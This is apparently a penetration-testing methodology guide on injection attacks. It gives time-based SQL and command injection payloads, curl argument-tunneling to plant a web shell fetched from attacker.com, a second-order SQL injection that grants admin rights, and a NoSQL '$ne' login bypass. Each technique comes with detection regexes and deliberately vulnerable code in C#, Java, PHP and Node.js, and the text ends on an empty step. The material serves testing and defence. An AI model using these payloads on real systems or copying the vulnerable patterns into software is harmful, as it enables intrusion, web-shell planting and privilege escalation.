# Injection Attack

## Check List

## Methodology

### Black Box

#### [Refresh Token Parameter](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-time-based)

{% stepper %}
{% step %}
Log in to the site and complete the authentication process
{% endstep %}

{% step %}
Intercept requests while completing the authentication process using Burp Suite
{% endstep %}

{% step %}
During the authentication completion process, if the site uses the OAuth mechanism, check the requests to see if you see a parameter called `refresh_token`
{% endstep %}

{% step %}
And if the site uses REST APIs for authentication and sends data in JSON format, look for the refresh\_token parameter
{% endstep %}

{% step %}
Test SQL injection payloads by finding this parameter at the specified points to identify the vulnerability, as shown below

```http
POST /api/v1/token HTTP/1.1
Host: tsftp.example.com
User-Agent: curl/7.88.1
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Connection: close

{
  "grant_type": "refresh_token",
  "refresh_token": "'; WAITFOR DELAY '0:0:1'--"
}
```
{% endstep %}

{% step %}
Another example is the refresh\_token parameter, which is also used in Oauth

```http
POST /oauth2/token HTTP/1.1
Host: <token-server.example.com>
Content-Type: application/x-www-form-urlencoded
Accept: application/json
Connection: close

grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--&client_id=<CLIENT_ID>&client_secret=<CLIENT_SECRET>&scope=<optional_scopes>
```
{% endstep %}

{% step %}
By injecting this code into this parameter, it may give us an error in response, but we should look at the response time to see if it really takes that long
{% endstep %}
{% endstepper %}

***

#### [JSON roleid Parameter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#time-based-injection)

{% stepper %}
{% step %}
Navigate to an API endpoint that processes JSON data, such as `/api/user`, `/api/roles`, `/api/profile`, or `/api/data`, typically requiring authentication via a token
{% endstep %}

{% step %}
Perform a login request to retrieve a valid token, ensuring access to the API endpoint that uses the roleid parameter
{% endstep %}

{% step %}
Locate the roleid parameter in the JSON body of the API request, often used to filter user roles or permissions and directly passed to a database query

```json
POST /api/roles HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: [variable]
Authorization: Bearer [token]
Origin: https://example.com
Referer: https://example.com/api/roles
Connection: close

{"roleid": 1}
```
{% endstep %}

{% step %}
Modify the roleid parameter with a simple time-based payload like `1 AND SLEEP(20)` to induce a 20-second delay if the query executes

```json
POST /api/roles HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: [variable]
Authorization: Bearer [token]
Origin: https://example.com
Referer: https://example.com/api/roles
Connection: close

{"roleid": "1 AND SLEEP(20)"}
```

Use Burp Suite or curl to send the modified request and measure the response time. A \~20-second delay (21,131 ms) confirms the payload executed in the database
{% endstep %}

{% step %}
Send a non-delaying request with the original roleid value (`{"roleid": 1}`) or a neutral payload (`{"roleid": "1 AND 1=1"}`) to ensure no delay occurs, verifying the injection
{% endstep %}
{% endstepper %}

***

#### XML field

{% stepper %}
{% step %}
When you identify an XML-based API endpoint (processing user data like number, email, or mobile), test fields such as `<Number>` for Blind OS Command Injection using time-delay payloads to confirm execution without visible output. Focus on common XML processing endpoints across enterprise or government web services
{% endstep %}

{% step %}
Capture a legitimate XML request using Burp Suite when submitting personal data through the web service (profile update, form submission)
{% endstep %}

{% step %}
Locate the target field (`<Number>1234567890123</Number>`) that accepts user input and is likely passed to a backend shell command
{% endstep %}

{% step %}
Send a baseline request with normal input and record the average response time (\~56 ms)
{% endstep %}

{% step %}
Inject a cross-platform time-delay payload into the field using command chaining to force a `~10–15` second delay:

```bash
<Number>|ping -n 11 127.0.0.1||ping -c 11 127.0.0.1</Number>
```
{% endstep %}

{% step %}
Measure the response time; if it increases significantly (`~11,876 ms`), it confirms blind command execution
{% endstep %}
{% endstepper %}

***

### White Box

#### OS Command Injection via Argument Switch Tunneling in Executable Wrappers

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on enterprise utilities that interface with the underlying operating system to perform heavy tasks (e.g., generating PDFs from HTML, converting video formats using FFmpeg, downloading external resources via cURL or Wget)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the backend controller responsible for orchestrating the native OS binary
{% endstep %}

{% step %}
Identify the "Safe Execution" architecture. Modern frameworks actively discourage passing raw strings to a shell (e.g., `bash -c`). Instead, developers utilize safe subprocess APIs (like Node's `child_process.execFile` or Java's `ProcessBuilder`) that execute the binary directly and pass arguments as an array
{% endstep %}

{% step %}
Investigate the Parameter Sanitization. Because the arguments are passed as an array, the OS does not invoke a shell interpreter. Consequently, traditional command injection metacharacters (`;`, `&&`, `|`, `` ` ``) are completely neutralized. The developer assumes the execution is perfectly safe
{% endstep %}

{% step %}
Analyze the Target Binary's internal capabilities. Binaries like `curl`, `tar`, `wkhtmltopdf`, or `exiftool` possess massive, complex feature sets controlled by command-line switches (e.g., `--output`, `--config`, `--post-file`)
{% endstep %}

{% step %}
Discover the fatal Argument Tunneling vulnerability: The backend developer securely passes the user's input as an array element but fails to verify that the input string does not begin with a hyphen (`-` or `--`)
{% endstep %}

{% step %}
Understand the bypass: The native binary cannot distinguish between a hardcoded backend switch and a user-provided string that happens to look like a switch. If the attacker supplies `--config=/tmp/malicious.conf` instead of `[https://target.com](https://target.com)`, the binary parses it as an operational directive rather than a data parameter
{% endstep %}

{% step %}
Formulate the Switch Tunneling payload. Identify the specific binary being executed (e.g., `curl`)
{% endstep %}

{% step %}
Review the `man` page for the target binary to find destructive switches. For `curl`, the `-o` or `--output` switch allows arbitrary file writes
{% endstep %}

{% step %}
Construct a payload designed to overwrite a sensitive system file or write a web shell into the public web root. Payload: `--output /var/www/html/shell.`
{% endstep %}

{% step %}
Transmit the payload to the API endpoint that expects the standard data input (e.g., `POST /api/v1/tools/fetch` with `{"url": "-o /var/www/html/shell.php"}`)
{% endstep %}

{% step %}
The backend framework securely constructs the execution array: `['curl', '-o /var/www/html/shell.php']`
{% endstep %}

{% step %}
The framework bypasses the shell interpreter and invokes the binary directly
{% endstep %}

{% step %}
The binary boots, parses the argument array, and evaluates the attacker's input as an explicit configuration switch. The binary executes its native functionality under the attacker's control, achieving arbitrary file read/write or secondary command execution without ever triggering standard shell-injection syntax

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(\.ArgumentList\.Add\(.*request)|(ProcessStartInfo\s*\{.*Arguments\s*=)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(ProcessBuilder\([^,]+,\s*.*request)|(new\s+ProcessBuilder\([^)]*request)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(escapeshellarg\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(spawn\([^,]+,\s*\[.*req\.(body|query))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
"\.ArgumentList\.Add\(.*request|ProcessStartInfo\s*\{.*Arguments\s*="
```
{% endtab %}

{% tab title="Java" %}
```regexp
"ProcessBuilder\([^,]+,\s*.*request|new\s+ProcessBuilder\([^)]*request"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
"escapeshellarg\("
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
"spawn\([^,]+,\s*\[.*req\.(body|query)"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("/api/v1/tools/fetch")]
public IActionResult FetchResource([FromBody] FetchRequest req)
{
    // [1]
    // [2]
    // Modern .NET utilizes ArgumentList to prevent shell execution.
    var process = new Process
    {
        StartInfo = new ProcessStartInfo
        {
            FileName = "curl",
            UseShellExecute = false, // Shell execution explicitly disabled
            RedirectStandardOutput = true
        }
    };

    // [3]
    // [4]
    // The untrusted input is added safely as an argument, but the binary itself 
    // interprets '--upload-file' as a command instruction, not a URL.
    process.StartInfo.ArgumentList.Add(req.Url);
    
    process.Start();
    process.WaitForExit();

    return Ok();
}
```
{% endtab %}

{% tab title="Java" %}
```java
@PostMapping("/api/v1/tools/fetch")
public ResponseEntity<?> fetchResource(@RequestBody FetchRequest req) throws IOException {
    // [1]
    // [2]
    String url = req.getUrl();

    // [3]
    // [4]
    // ProcessBuilder natively avoids the shell, preventing "url; rm -rf /".
    // But passing "-K /tmp/malicious_config.txt" tricks curl into reading a hostile config.
    ProcessBuilder pb = new ProcessBuilder("curl", url);
    Process p = pb.start();
    
    return ResponseEntity.ok("Dispatched");
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class ToolController extends Controller
{
    public function fetchResource(Request $request)
    {
        // [1]
        // [2]
        $url = $request->input('url');

        // [3]
        // [4]
        // escapeshellarg() wraps the input in single quotes, preventing shell breakout.
        // It becomes: curl '--output /var/www/shell.php'
        // curl still parses this single-quoted string as a valid command-line switch!
        $safeUrl = escapeshellarg($url);
        
        $output = shell_exec("curl {$safeUrl}");

        return response()->json(['output' => $output]);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const { spawn } = require('child_process');

router.post('/api/v1/tools/fetch', (req, res) => {
    // [1]
    // [2]
    // The developer intends to fetch a remote URL for the user.
    let targetUrl = req.body.url;

    // [3]
    // [4]
    // The developer correctly uses 'spawn' with an array, neutralizing shell metacharacters (; && |).
    // However, they fail to check if 'targetUrl' starts with a hyphen (--).
    // If the attacker sends {"url": "--output /var/www/html/shell.php"}, curl treats it as a flag.
    const fetchProc = spawn('curl', [targetUrl]);

    fetchProc.on('close', (code) => {
        res.send({ status: 'Fetch complete', code: code });
    });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture relies on robust, native OS binaries to perform complex data manipulation that would be too slow or difficult to implement purely in the application's runtime language, \[2] To eliminate traditional Command Injection vulnerabilities, engineers explicitly avoid invoking a shell interpreter (e.g., `/bin/sh -c`), \[3] Developers utilize framework APIs that transmit parameters directly to the binary's `argv` array, neutralizing all standard bash/sh syntax manipulation (like pipes or command substitution), \[4] The execution sink. Developers erroneously equated "shell isolation" with "binary safety." They failed to sanitize the input for leading hyphens (`-` or `--`). Because the OS passes the array directly to the executable, the target executable's internal parsing engine takes over. The executable natively reads the attacker's input, identifies the leading hyphen, and parses the string as a highly privileged operational switch rather than a data argument. The attacker successfully hijacks the binary's internal capabilities, achieving system compromise without executing a single shell command

```http
// 1. Attacker controls an external server hosting a malicious web shell script.
// 2. Attacker targets the application's 'Fetch URL' utility.

POST /api/v1/tools/fetch HTTP/1.1
Host: api.enterprise.tld
Content-Type: application/json
Authorization: Bearer <attacker_token>

{
  "url": "--output /var/www/html/assets/logo.php https://attacker.com/shell.txt"
}

// 3. The backend receives the payload and passes it directly to the 'curl' binary array.
//    Executing: curl "--output /var/www/html/assets/logo.php https://attacker.com/shell.txt"
// 4. The shell interpreter is bypassed, but curl parses the arguments natively.
// 5. curl identifies the '--output' switch. It downloads the contents of the attacker's URL 
//    and forcefully writes it to the server's public web root.

// 6. The attacker navigates to the newly planted web shell to achieve full RCE.
GET /assets/logo.php?cmd=whoami HTTP/1.1
Host: api.enterprise.tld
```
{% endstep %}

{% step %}
To safely harness the power of external operating system binaries, architects mandated the use of isolated execution APIs (like `ProcessBuilder` or `spawn`) that strictly bypass shell interpreters. This optimization successfully neutralized classical command injection by converting all input into static array elements. The systemic security failure arose from a profound misunderstanding of argument parsing boundaries. Developers falsely assumed that because an array element was sanitized against shell execution, it was mathematically inert. They failed to account for the internal parsing engines written into the native binaries themselves. By omitting input validation checks for switch prefixes (e.g., `-` or `--`), the developers allowed user data to masquerade as operational flags. The attacker exploited this transparency by submitting perfectly valid binary switches. The underlying executable obediently parsed these switches, forcefully overwriting its intended execution path and weaponizing its native feature set against the host server
{% endstep %}
{% endstepper %}

***

#### Second-Order SQL Injection via Asynchronous Background Job Processing

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on endpoints where data is ingested and saved seamlessly, but processed or aggregated out-of-band by a secondary system (e.g., Nightly Billing Runs, PDF Report Generators, or Data Warehouse sync operations)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the primary Web API controllers and the decoupled Background Worker repositories
{% endstep %}

{% step %}
Identify the "Parameterized Ingestion" architecture. In modern web applications, the primary API endpoints utilize robust Object-Relational Mappers (ORMs) like Entity Framework, Hibernate, or Sequelize. When a user updates their profile name, the ORM perfectly parameterizes the query, completely neutralizing traditional SQL Injection
{% endstep %}

{% step %}
Investigate the Decoupled Worker context. Because complex reporting tasks are CPU-intensive, they are offloaded to background cron jobs or message queue consumers
{% endstep %}

{% step %}
Analyze the Worker's database access logic. Often, background workers are written as lightweight scripts or utilize raw SQL to perform massive batch updates efficiently, bypassing the ORM layer entirely
{% endstep %}

{% step %}
Discover the fatal trust boundary collapse: The background worker pulls data _out_ of the primary database. The developer assumes that because the data resides within their own secure database, it is mathematically "clean.
{% endstep %}

{% step %}
Understand the vulnerability: The background worker reads the attacker's previously saved, malicious string. Believing the data is safe, the worker interpolates the string directly into a raw, unparameterized batch SQL query
{% endstep %}

{% step %}
Formulate the Second-Order SQLi payload. Identify a persistent data field that you control, which will eventually be processed by a background task (e.g., a "Company Name" that gets embedded into a monthly invoice)
{% endstep %}

{% step %}
Construct an SQL injection payload tailored for the worker's database engine (e.g., Postgres, SQL Server). Payload: `Acme Corp'; UPDATE users SET role='admin' WHERE id=99; --`&#x20;
{% endstep %}

{% step %}
Submit the payload via the secure, primary web API: `PUT /api/v1/profile` with `{"company_name": "Acme Corp'; UPDATE users SET role='admin' WHERE id=99; --"}`
{% endstep %}

{% step %}
The primary API uses parameterized queries. The data is saved harmlessly into the database as a literal string. No injection occurs
{% endstep %}

{% step %}
Wait for the asynchronous trigger. The nightly billing cron job executes at 00:00 UTC
{% endstep %}

{% step %}
The background worker queries the database: `SELECT company_name FROM profiles`. It retrieves your payload
{% endstep %}

{% step %}
The worker constructs the batch query: `db.execute("INSERT INTO monthly_invoices (title) VALUES ('Invoice for " + company_name + "')")`. The payload breaks the SQL syntax, escapes the string context, and executes the appended `UPDATE` command, granting the attacker full administrative access via delayed execution

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(\[Queueable\]\s*.*ExecuteSqlCommandAsync\(\$)|(ExecuteSqlRaw\(.*\+\s*[a-zA-Z0-9_]+)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(@Scheduled.*jdbcTemplate\.update\(".*"\s*\+\s*[a-zA-Z0-9_]+\.get)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(DB::statement\(".*\{\$[a-zA-Z0-9_]+->)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(cron\.schedule\(.*db\.(execute|query)\(.*[a-zA-Z0-9_]+\.name)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
"\[Queueable\]\s*.*ExecuteSqlCommandAsync\(\\$|ExecuteSqlRaw\(.*\+\s*[a-zA-Z0-9_]+"
```
{% endtab %}

{% tab title="Java" %}
```regexp
"@Scheduled.*jdbcTemplate\.update\(\".*\"\s*\+\s*[a-zA-Z0-9_]+\.get"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
"DB::statement\(\".*\\{\\$[a-zA-Z0-9_]+->"
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
"cron\.schedule\(.*db\.(execute|query)\(.*[a-zA-Z0-9_]+\.name"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPut("/api/v1/company")]
public async Task<IActionResult> UpdateCompany([FromBody] CompanyDto req)
{
    // [1]
    // [2]
    var company = await _dbContext.Companies.FindAsync(User.GetCompanyId());
    company.Name = req.Name; // Entity Framework parameterizes this securely
    await _dbContext.SaveChangesAsync();
    return Ok();
}

public class MonthlyReportJob
{
    // [3]
    // [4]
    // Executed asynchronously via Hangfire/Quartz
    public async Task GenerateReports()
    {
        var companies = await _dbContext.Companies.ToListAsync();
        foreach(var company in companies)
        {
            // Developers often use raw SQL in batch jobs for performance.
            // The untrusted company.Name evaluates as raw SQL commands.
            var sql = $"UPDATE Billing SET Description = 'Billed to {company.Name}' WHERE Id = {company.Id}";
            await _dbConnection.ExecuteAsync(sql); 
        }
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@RestController
public class CompanyController {
    // [1]
    // [2]
    @PutMapping("/api/v1/company")
    public void updateCompany(@RequestBody CompanyDto req) {
        // Saved via secure JPA/Hibernate parameterization
        companyRepository.updateName(req.getName(), getCurrentId()); 
    }
}

@Service
public class ReportingService {
    // [3]
    // [4]
    @Scheduled(cron = "0 0 * * * *")
    public void runNightlyBatch() {
        List<Company> companies = companyRepository.findAll();
        for (Company c : companies) {
            // String concatenation with database-retrieved data causes Second-Order SQLi
            String sql = "INSERT INTO logs (message) VALUES ('Processed " + c.getName() + "')";
            jdbcTemplate.execute(sql);
        }
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
// [1]
// [2]
// Web controller saves data using Eloquent
public function update(Request $request) {
    $company = auth()->user()->company;
    $company->name = $request->input('name');
    $company->save();
}

// [3]
// [4]
// Queued Job handles heavy processing
class GenerateReportJob implements ShouldQueue
{
    public function handle()
    {
        $companies = Company::all();
        foreach ($companies as $company) {
            // Raw DB statements in batch jobs blindly trust internal data
            DB::statement("INSERT INTO archive (org_name) VALUES ('{$company->name}')");
        }
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
// [1]
// [2]
// Primary API saves data securely via Sequelize ORM parameterization
router.put('/api/v1/company', async (req, res) => {
    await Company.update({ name: req.body.name }, { where: { id: req.user.companyId } });
    res.send('Saved safely.');
});

// [3]
// [4]
// Background worker executing outside the web lifecycle
cron.schedule('0 0 1 * *', async () => {
    const companies = await Company.findAll();
    
    for (let company of companies) {
        // Fatal Flaw: The cron job trusts data retrieved from the database.
        // It interpolates the company.name directly into a raw SQL batch query.
        const query = `INSERT INTO reports (summary) VALUES ('Monthly run for ${company.name}')`;
        await sequelize.query(query); // Second-Order SQLi detonates here
    }
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture separates synchronous user interactions from heavy, asynchronous batch processing, ensuring the primary APIs remain lightning fast, \[2] The primary API endpoints strictly enforce parameterized queries via modern ORMs, completely immunizing the public-facing transport layer against First-Order SQL Injection, \[3] The background workers rely on high-performance, raw SQL queries to process millions of records sequentially, deliberately bypassing the heavy ORM abstraction layers, \[4] The execution sink. Developers suffered a critical contextual bias, equating "Data inside our database" with "Mathematically safe data." Because the attacker's payload survived the initial parameterized insertion flawlessly, it rested dormant within the database schema as a literal string. When the asynchronous worker retrieved this string, it abandoned parameterization protocols, concatenating the dormant payload directly into a raw execution matrix. The attacker exploits this temporal decoupling by planting a sophisticated SQL sequence. Hours or days later, the automated background worker unwittingly exhumed the payload and detonated it against the core infrastructure, executing unauthorized database mutations completely out-of-band

```http
// 1. Attacker targets a standard, perfectly secure profile update endpoint.
// 2. The attacker crafts a payload designed to break a raw SQL INSERT/UPDATE 
//    statement, terminate the line, and inject a secondary command.

PUT /api/v1/company/profile HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker_token>
Content-Type: application/json

{
  "name": "Attacker Inc'); UPDATE users SET role='SUPER_ADMIN' WHERE email='attacker@evil.com'; -- "
}

// 3. The API uses an ORM. The SQL executed on the backend looks like:
//    UPDATE companies SET name = $1 WHERE id = $2
//    Values: ["Attacker Inc'); UPDATE users...", 991]
// 4. The data is saved cleanly. No error is thrown. The attacker waits.

// 5. At Midnight, the enterprise Cron Job boots up.
// 6. It selects all companies and loops through them.
// 7. It extracts the attacker's company name and concatenates it into a raw string:
//    "INSERT INTO logs (message) VALUES ('Processed " + company.name + "')"

// 8. The final SQL executed by the Cron Job becomes:
//    INSERT INTO logs (message) VALUES ('Processed Attacker Inc'); 
//    UPDATE users SET role='SUPER_ADMIN' WHERE email='attacker@evil.com'; -- ')

// 9. The database executes the INSERT, completes it, and immediately executes the UPDATE.
// 10. The attacker's account is permanently promoted to SUPER_ADMIN without ever 
//     triggering a WAF or synchronous API alarm.
```
{% endstep %}

{% step %}
To ensure maximum public-facing API performance, software architects decoupled heavy data aggregation from user requests, transferring the computational burden to asynchronous background workers. This architecture created two distinct data processing environments. The frontend APIs, operating in a zero-trust posture, rigorously parameterized all user inputs prior to database persistence. Conversely, the background workers, operating within the hardened internal perimeter, adopted an implicit-trust posture toward all data retrieved from the primary database. The systemic failure arose because developers equated successful database storage with absolute data sanitization. The attacker exploited this asymmetric trust model by lodging a weaponized SQL fragment into the secure primary store. This payload remained dormant, surviving entirely intact as a literal string. Upon scheduled execution, the internal worker extracted the payload and interpolated it into an unparameterized batch command. This action forcefully re-contextualized the inert string into an active execution directive, effectively utilizing the enterprise's own automated infrastructure to detonate a devastating, out-of-band database hijacking
{% endstep %}
{% endstepper %}

***

#### NoSQL Injection via Type Juggling and BSON Operator Deserialization

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on API endpoints that consume `application/json` payloads and interface directly with NoSQL databases (e.g., MongoDB, CouchDB, CosmosDB)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the backend API's routing and database querying layers
{% endstep %}

{% step %}
Identify the "Direct Object Mapping" architecture. In modern Node.js/Express stacks utilizing MongoDB (Mongoose), developers frequently pass the parsed `req.body` directly into the database query object to streamline code (e.g., `User.find(req.body)`)
{% endstep %}

{% step %}
Investigate the JSON parsing layer. The framework's body parser (like `express.json()`) parses incoming payloads strictly according to the JSON specification. Unlike traditional URL-encoded forms which exclusively transmit strings, JSON natively supports complex types: Arrays `[]` and Objects `{}`
{% endstep %}

{% step %}
Analyze the NoSQL Database query syntax. MongoDB queries do not use SQL strings; they use BSON (Binary JSON) objects. MongoDB relies heavily on specific keys starting with the `$` character to define query operators (e.g., `$ne` for Not Equal, `$gt` for Greater Than, `$in` for In Array)
{% endstep %}

{% step %}
Discover the fatal boundary collapse: The developer writes an authentication or search query assuming the incoming JSON properties are strings. E.g., `User.findOne({ username: req.body.username, password: req.body.password })`
{% endstep %}

{% step %}
Understand the vulnerability: Because the backend accepts `req.body.password` without explicitly casting it to a String, an attacker can substitute the expected string value with a malicious BSON Object containing a NoSQL operator
{% endstep %}

{% step %}
Formulate the NoSQL Operator payload. You must bypass an authentication check or extract unauthorized records by forcing the database to evaluate a logic operator instead of a literal string match
{% endstep %}

{% step %}
Identify the target login endpoint: `POST /api/v1/auth/login`
{% endstep %}

{% step %}
Instead of sending standard strings (`{"username": "admin", "password": "password123"}`), rewrite the JSON payload to inject an object into the password field
{% endstep %}

{% step %}
Construct the payload: `{"username": "admin", "password": {"$ne": null}}`
{% endstep %}

{% step %}
Transmit the payload. The Express JSON parser accurately converts the payload into a nested JavaScript object
{% endstep %}

{% step %}
The backend evaluates the query: `User.findOne({ username: 'admin', password: { $ne: null } })`
{% endstep %}

{% step %}
The MongoDB engine receives the BSON document. It evaluates the logic: "Find a user where the username is 'admin' AND the password is NOT EQUAL to null." Since every valid user has a password hash that is not null, the query evaluates to `TRUE`. The database returns the Admin user object, and the backend issues a valid session JWT, granting absolute authentication bypass via Type Juggling

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
id="8qv3rm"
(collection\.Find\(BsonDocument\.Parse)
```
{% endtab %}

{% tab title="Java" %}
```regexp
id="5k9xpd"
(mongoTemplate\.find\(new\s+BasicQuery)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
id="2h7nfw"
(findOne\(\s*\$[a-zA-Z0-9_]+\))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
id="6tq4vb"
(\.findOne\(\s*req\.(body|query)\s*\))|(\.find\(\s*\{\s*[a-zA-Z0-9_]+\s*:\s*req\.(body|query)\.[a-zA-Z0-9_]+\s*\}\s*\))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
id="9m4wkt"
"collection\.Find\(BsonDocument\.Parse"
```
{% endtab %}

{% tab title="Java" %}
```regexp
id="1v8qzs"
"mongoTemplate\.find\(new\s+BasicQuery"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
id="3x6jhf"
"findOne\(\s*\\$[a-zA-Z0-9_]+\s*\)"
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
id="7p2nvc"
"\.findOne\(\s*req\.(body|query)\s*\)|\.find\(\s*\{\s*[a-zA-Z0-9_]+\s*:\s*req\.(body|query)\.[a-zA-Z0-9_]+\s*\}\s*\)"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("/api/v1/auth/login")]
public async Task<IActionResult> Login([FromBody] JsonElement payload)
{
    // [1]
    // [2]
    // Advanced microservices sometimes accept raw JSON to build dynamic queries
    var jsonString = payload.GetRawText();

    // [3]
    // [4]
    // Directly parsing untrusted JSON into a BsonDocument forces the MongoDB driver 
    // to execute any embedded operational directives (like $where or $regex).
    var filter = BsonDocument.Parse(jsonString);
    var user = await _usersCollection.Find(filter).FirstOrDefaultAsync();

    if (user != null) return Ok(GenerateToken(user));
    return Unauthorized();
}
```
{% endtab %}

{% tab title="Java" %}
```java
@PostMapping("/api/v1/search")
public ResponseEntity<?> searchRecords(@RequestBody String jsonQuery) {
    // [1]
    // [2]
    // Developers sometimes use raw JSON strings to support complex, 
    // dynamic frontend search grids.
    
    // [3]
    // [4]
    // BasicQuery completely bypasses Spring Data's safe mapping layers.
    // It evaluates the raw JSON string natively against the Mongo engine, 
    // executing any injected NoSQL operators.
    Query query = new BasicQuery(jsonQuery);
    List<Record> results = mongoTemplate.find(query, Record.class);
    
    return ResponseEntity.ok(results);
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class AuthController extends Controller
{
    public function login(Request $request)
    {
        // [1]
        // [2]
        // Laravel's Request object parses JSON input automatically.
        $credentials = $request->only(['username', 'password']);

        // [3]
        // [4]
        // The Jenssegers library translates the Eloquent where() clause into MongoDB queries.
        // If the attacker provides an array for the password (e.g. password[$ne]=null), 
        // the driver evaluates the logical operator, bypassing the equality check.
        $user = User::where('username', $credentials['username'])
                    ->where('password', $credentials['password'])
                    ->first();

        if ($user) {
            return response()->json(['token' => $user->createToken('auth')->plainTextToken]);
        }

        return response()->json(['error' => 'Unauthorized'], 401);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const express = require('express');
const router = express.Router();

router.post('/api/v1/auth/login', async (req, res) => {
    // [1]
    // [2]
    // The developer expects req.body.username and req.body.password to be simple strings.
    // However, express.json() will faithfully parse {"password": {"$ne": "invalid"}} into a nested object.

    // [3]
    // [4]
    // Fatal Flaw: Passing untyped user input directly into a MongoDB query object.
    // If req.body.password is an object containing a BSON operator, Mongoose executes it natively.
    const user = await User.findOne({ 
        username: req.body.username, 
        password: req.body.password 
    });

    if (user) {
        const token = generateToken(user);
        return res.json({ success: true, token });
    }
    
    res.status(401).send('Invalid credentials');
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture leverages NoSQL document databases to provide flexible, highly scalable data storage, tightly integrated with modern JSON-based REST APIs, \[2] The backend framework natively decodes incoming JSON payloads into complex, nested, dynamically-typed data structures (e.g., JavaScript Objects or PHP Arrays), \[3] The architecture relies heavily on the database driver to translate these dynamically typed structures directly into executable database queries, \[4] The execution sink. Traditional SQL Injection relies on breaking out of string encapsulation using quotes (`'`). NoSQL databases, however, do not process raw query strings; they process hierarchical BSON documents containing programmatic operational keys (like `$ne`, `$regex`, `$where`). Developers fundamentally misunderstood this paradigm, failing to explicitly cast incoming HTTP parameters to primitive Strings prior to query execution. The attacker exploits this Type Juggling vulnerability by morphing a standard string field into a nested logical object. The NoSQL engine natively interprets the injected `$ne` operator, dynamically modifying the query logic to evaluate to `TRUE` regardless of the actual password, culminating in absolute authentication bypass without a single line of traditional injection syntax

```http
// 1. Attacker targets the authentication endpoint of an Express/MongoDB stack.
// 2. Attacker formats the standard request structure.
POST /api/v1/auth/login HTTP/1.1
Host: api.enterprise.tld
Content-Type: application/json

// 3. Attacker knows the target username (e.g., "admin").
// 4. Instead of attempting to guess the password string, the attacker replaces the 
//    password value with a nested JSON object containing a MongoDB Evaluation Operator.
{
  "username": "admin",
  "password": { "$ne": null }
}

// 5. The Express body-parser receives the JSON. It accurately constructs a JS object:
//    { username: 'admin', password: { $ne: null } }
// 6. The object is passed to Mongoose: User.findOne(...)
// 7. Mongoose translates the object to a BSON query.
// 8. The database engine executes: "Find a record where username is 'admin' AND password is Not Equal to null".
// 9. The query matches the Admin user record perfectly.

HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "token": "eyJhbGciOiJIUzI1NiIsInR5c... [VALID_ADMIN_JWT]"
}
```
{% endstep %}

{% step %}
